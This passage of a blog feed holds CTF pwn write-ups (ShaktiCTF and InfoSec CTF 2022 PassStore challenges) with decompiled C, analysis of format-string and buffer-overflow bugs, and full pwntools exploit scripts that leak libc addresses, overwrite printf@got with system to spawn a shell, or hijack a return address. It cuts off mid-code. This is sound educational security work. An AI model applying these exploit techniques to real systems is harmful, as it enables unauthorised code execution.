<span class="built_in">puts</span>(<span class="string">&quot;Invalid choice!&quot;</span>);</span><br><span class="line">      exit_function(<span class="number">0LL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="string">&#x27;1&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      num_dragons = use_dragons();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="string">&#x27;2&#x27;</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">      kings_landing(&amp;num_men, &amp;num_dragons);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The main function has a 3 functions to keep an eye on.</p><ol><li>num_dragons &#x3D; use_dragons();</li><li>kings_landing(&amp;num_men, &amp;num_dragons);</li><li>white_walkers(&amp;num_men, &amp;num_dragons);</li></ol><p>Let’s take a look at each one.</p><h4 id="1-use-dragons"><a href="#1-use-dragons" class="headerlink" title="1. use_dragons()"></a>1. <code>use_dragons()</code></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">use_dragons</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> format[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n\nYou currently have %d number of dragons.\n&quot;</span>, <span class="number">3LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nSay something in Valyrian: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%10s&quot;</span>, format);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The dragons say: &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(format);                               <span class="comment">// fsb</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">3LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>In this function, format variable receives 10 characters from player and outputs them as they are. Since <code>printf()</code> doesn’t specify a format string when printing, the <strong>Format String Bug(FSB)</strong> possibility exists.</p><p>The return value 3 is stored in <code>num_dragons</code> that global variable.</p><h4 id="2-kings-landing-amp-num-men-amp-num-dragons"><a href="#2-kings-landing-amp-num-men-amp-num-dragons" class="headerlink" title="2. kings_landing(&amp;num_men, &amp;num_dragons)"></a>2. <code>kings_landing(&amp;num_men, &amp;num_dragons)</code></h4><p>In this funciton, the main parts of the functon are as follows.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( choice == <span class="string">&#x27;2&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *num_dragons &amp;&amp; *num_dragons &lt;= <span class="number">3u</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;How many dragons would you like to use ?\n&gt; &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;use_dragons);</span><br><span class="line">      <span class="keyword">if</span> ( use_dragons &amp;&amp; use_dragons &lt;= <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        *num_dragons -= use_dragons;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%u dragon(s) have been used!\nAre you going to kill the white walkers ?\n&gt; &quot;</span>, use_dragons);</span><br><span class="line">        getchar();</span><br><span class="line">        __isoc99_scanf(<span class="string">&quot;%50[^\n]s&quot;</span>, format);</span><br><span class="line">        <span class="built_in">printf</span>(format);                         <span class="comment">// fsb</span></span><br><span class="line">      &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;You only use dragons that you have&quot;</span>);</span><br><span class="line">        exit_function(<span class="number">0LL</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>We can use the 3 dragons. It means we have the <strong>3 chances with FSB</strong> in this function. However, the <code>use_dragons()</code> must precede this function.</p><h4 id="3-white-walkers-amp-num-men-amp-num-dragons"><a href="#3-white-walkers-amp-num-men-amp-num-dragons" class="headerlink" title="3. white_walkers(&amp;num_men, &amp;num_dragons)"></a>3. <code>white_walkers(&amp;num_men, &amp;num_dragons)</code></h4><p>There is no meaningful code to find vulnerablilties.</p><h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><p>In <code>use_dragons()</code> function, There is 1 FSB.<br>In <code>kings_landing()</code> function, There are 3 chances with FSB.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>The exploit progressed relatively quickly in the local environment, but took a long time in the remote envireonment. I guess it’s because of libc version.</p><p>(It may be my mistake that I downloaded the wrong libc from CTF web site..)</p><p>Even though libc was given, this version doesn’t seem to match from remote environment, so I guessed the offset. Except for the offset, the exploit is same as in the local environment. <strong>So the offest is dirty because it was obtained by guessing.</strong></p><h3 id="Exploit-Scenario"><a href="#Exploit-Scenario" class="headerlink" title="Exploit Scenario"></a>Exploit Scenario</h3><p>We have to leak the base address of the binary and libc using <strong>FSB that in <code>use_dragons()</code></strong>. After getting the bases, we know the address of ‘printf()’ in binary and <code>system()</code> in libc. So we can overwriting <code>system()</code> to <code>printf@got</code>. In this case, it uses <strong>the FSB triggered by the <code>kings_landing()</code></strong>. </p><p>I use the <code>fmtstr_payload</code> in pwntools for comfortable. The FSB payload has a 50 length limit, so I use the <code>write_size</code> argument and only 4 bytes of the <code>system()</code> for overwriting.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = fmtstr_payload(<span class="number">10</span>, &#123;e.got[<span class="string">&#x27;printf&#x27;</span>] : p64(system)[:<span class="number">4</span>] &#125;, write_size = <span class="string">&#x27;short&#x27;</span>)</span><br></pre></td></tr></table></figure><p>After overwriting, When the <code>printf()</code> is executed, the <code>system()</code> will be executed. We need to focus on the <code>printf()</code> that has only one argument. That argument is our input. It means that we have to find <code>pirntf(input);</code> same as <code>system(input);</code>. </p><p>It is not implemented in the exploit code, but after interactive we can execute the <code>use_dragons()</code> and sent the <code>sh</code> string to the part that receives the input values.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">use_dragons</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> format[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%10s&quot;</span>, format);</span><br><span class="line">  <span class="built_in">printf</span>(format); <span class="comment">// system(format);</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">3LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>You may be wondering if it’s okay to pass invalid arguments to the <code>system()</code>. For example as below.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// printf(&quot;\n\nYou currently have %d number of dragons.\n&quot;, 3LL);</span></span><br><span class="line">system(<span class="string">&quot;\n\nYou currently have %d number of dragons.\n&quot;</span>, <span class="number">3LL</span>);</span><br></pre></td></tr></table></figure><p>It just prints an error saying it can’t run but the binary isn’t exit.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh: line 1: ff: command not found</span><br></pre></td></tr></table></figure><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = e.libc</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;65.2.136.80&#x27;</span>, <span class="number">32261</span>)</span><br><span class="line">    <span class="comment"># p = process(&#x27;./chall&#x27;)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">use_dragons</span>(<span class="params">fmt</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;an:&#x27;</span>, fmt)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">kings_landing</span>(<span class="params">use, fmt</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;ns\n\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(use))</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, fmt)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">white_walkers</span>():</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak</span></span><br><span class="line">    use_dragons(<span class="string">&#x27;%17$p%39$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">    leak = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">    libc.address = leak-<span class="number">0x80</span>-<span class="number">0x23800</span>-<span class="number">0x800</span>-<span class="number">3</span></span><br><span class="line">    <span class="comment"># libc.address = leak - 0x851f0</span></span><br><span class="line">    info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">    e.address = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x1140</span></span><br><span class="line">    info(<span class="built_in">hex</span>(e.address))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># printf got -&gt; system</span></span><br><span class="line">    system = libc.address + <span class="number">0x55410</span>+<span class="number">0x100</span>-<span class="number">0x3180</span>-<span class="number">0x100</span></span><br><span class="line">    payload = fmtstr_payload(<span class="number">10</span>, &#123;e.got[<span class="string">&#x27;printf&#x27;</span>] : p64(system)[:<span class="number">4</span>] &#125;, write_size = <span class="string">&#x27;short&#x27;</span>)</span><br><span class="line">    <span class="comment"># if len(payload) &gt; 50:</span></span><br><span class="line">        <span class="comment"># p.close()</span></span><br><span class="line">        <span class="comment"># continue</span></span><br><span class="line">    <span class="comment"># print(len(payload))</span></span><br><span class="line">    kings_landing(<span class="number">1</span> ,payload)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># cmd</span></span><br><span class="line"><span class="comment"># In sue_dragons() function,</span></span><br><span class="line"><span class="comment"># system(&#x27;sh&#x27;);</span></span><br></pre></td></tr></table></figure><p>I used loop bescause of offset prediction and FSB payload length.</p><h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shaktictf&#123;F0rm4T_S7r1ng5_4nd_G0T_0v3Rwr17e_4r3_7h3_r34l_k1ll3rs_4d9ddd93416dd1881ae5a725a2cb0058&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fsb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>InfoSec CTF 2022 - Secure PassStoreV2</title>
      <link href="/221207-infosecctf2022-secure_passstorev2/"/>
      <url>/221207-infosecctf2022-secure_passstorev2/</url>
      
        <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>(8&#x2F;219) solves</p><h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>New! More secure! Latest version of Secure PassStoreV2! Url: 0.cloud.chals.io:15467</p><h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">└── passStoreV2</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passStoreV2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=1ff9162a72b5d184e7101eae1706a6eb6b57e374, for GNU/Linux 3.2.0, not stripped</span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><p>바로 전 문제인 version 1과의 차이는 하나다. 바로 key를 출력을 안해준다는 것.</p><h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">changeName</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your name is &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(username);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please type your name: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, username, <span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your new name: &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(username);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>printf는 null 바이트를 만나기 전까지 출력한다. 이를 이용해서 username 바로 뒤에 존재하는 key 값을 leak할 수 있다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.bss:00000000004040A0 username        db 20h dup(?)           ; DATA XREF: addName(void)+18↑o</span><br><span class="line">.bss:00000000004040A0                                         ; changeName(void)+18↑o ...</span><br><span class="line">.bss:00000000004040C0                 public key</span><br><span class="line">.bss:00000000004040C0 key             db    ? ;               ; DATA XREF: readPass(void)+6C↑o</span><br><span class="line">.bss:00000000004040C0                                         ; addPass(void)+70↑o ...</span><br></pre></td></tr></table></figure><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="Exploit-Scenario"><a href="#Exploit-Scenario" class="headerlink" title="Exploit Scenario"></a>Exploit Scenario</h3><ol><li>name을 0x20 바이트 꽉 채워 보내고 key 값 leak</li><li>payload 작성 후 addPass 함수의 로직 구현</li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;0.cloud.chals.io&#x27;</span>, <span class="number">15467</span>)</span><br><span class="line"></span><br><span class="line">name = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">name += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x1f</span></span><br><span class="line">name += <span class="string">b&#x27;B&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;name: \r\n&#x27;</span>, name)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;it\r\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;B&#x27;</span>)</span><br><span class="line">key = p.recvuntil(<span class="string">&#x27;P&#x27;</span>)[:-<span class="number">1</span>]</span><br><span class="line">info(key)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;name: \r\n&#x27;</span>, name)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;it\r\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">buf = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">buf += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x30</span>+<span class="number">0x8</span>)</span><br><span class="line">buf += p64(<span class="number">0x40160B</span>) <span class="comment"># 0x40160a</span></span><br><span class="line">buf += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line">src = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">255</span>):</span><br><span class="line">    <span class="keyword">if</span> buf[i] == <span class="number">10</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    src.append(key[i%<span class="number">8</span>] ^ buf[i])</span><br><span class="line"></span><br><span class="line">src = <span class="built_in">bytes</span>(src)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(src)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Pas5St0r3_15_n07_600d_50lu710n_;(&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>InfoSec CTF 2022 - Secure PassStoreV1</title>
      <link href="/221207-infosecctf2022-secure_passstorev1/"/>
      <url>/221207-infosecctf2022-secure_passstorev1/</url>
      
        <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>(8&#x2F;219) solves</p><h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>Try to use new superpuper secure command line password storage!</p><p>url: 0.cloud.chals.io:12367</p><h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">└── passStoreV1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passStoreV1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=2349feff7fdc9215b7e1275413f61af630980a82, for GNU/Linux 3.2.0, not stripped</span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>문제 풀다가 바이너리가 바뀌었다. &#x3D;ㅅ&#x3D; 원래 파이가 있었는데 파이가 사라졌다. </p><h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  welcome();</span><br><span class="line">  addName();</span><br><span class="line">  keyGen();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    menu();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>main은 이렇게 생겼다. welcome 함수는 볼 게 없어서 그 다음 함수부터 보자.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">addName</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please type your name: &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, username, <span class="number">0x20</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>전역 변수 username에 0x20 만큼 쓸 수 있다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">keyGen</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> seed; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  seed = time(<span class="number">0LL</span>);</span><br><span class="line">  srand(seed);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Some preparations....&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</span><br><span class="line">    key[i] = rand() % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Master key prepared!\nKey: &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(key);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>key를 출력해준다. 여기서 fsb가 발생할 수 있지만.. 컨트롤하기가 꽤 까다로워보인다. 아무튼 출력해주는 key를 뒤에서 어떻게 사용할까 생각하면서 일단 넘어간다. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Menu: &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1) Add password&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2) Read 